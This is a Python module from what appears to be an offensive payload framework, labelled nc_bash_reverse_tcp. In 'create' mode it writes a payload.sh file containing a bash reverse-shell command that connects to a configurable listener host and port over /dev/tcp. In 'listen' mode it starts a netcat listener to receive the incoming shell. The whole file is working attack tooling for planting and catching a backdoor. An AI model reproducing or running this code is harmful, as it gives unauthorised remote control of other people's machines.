import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_bash_reverse_tcp",
        "title"       : "Payload bash",
        "module"      : "payloads/nc/bash/reverse_tcp linux unix",
        "description" : "Payload creation and exploitation"
}

var.lname = ["payload.sh"]
var.ltype = ["listen"]

options ={
  "LHOST" : [str(var.lhost[0]),'The listen address'],
  "LPORT" : [str(var.lport[0]),'The listen port'],
  "LNAME" : [str(var.lname[0]),'The name of payload'],
  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark = '/'
            f = open(var.lname[0] , 'w')
            payload = '''
bash -i >& /dev/tcp/'''+var.lhost[0]+mark+var.lport[0]+''' 0>&1
'''
            f.write(payload)
            f.close()

        elif var.ltype[0] == "listen" or var.ltype[0] == "LISTEN":
            os.system("nc -l -p "+str(var.lport[0])+" -v")

        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
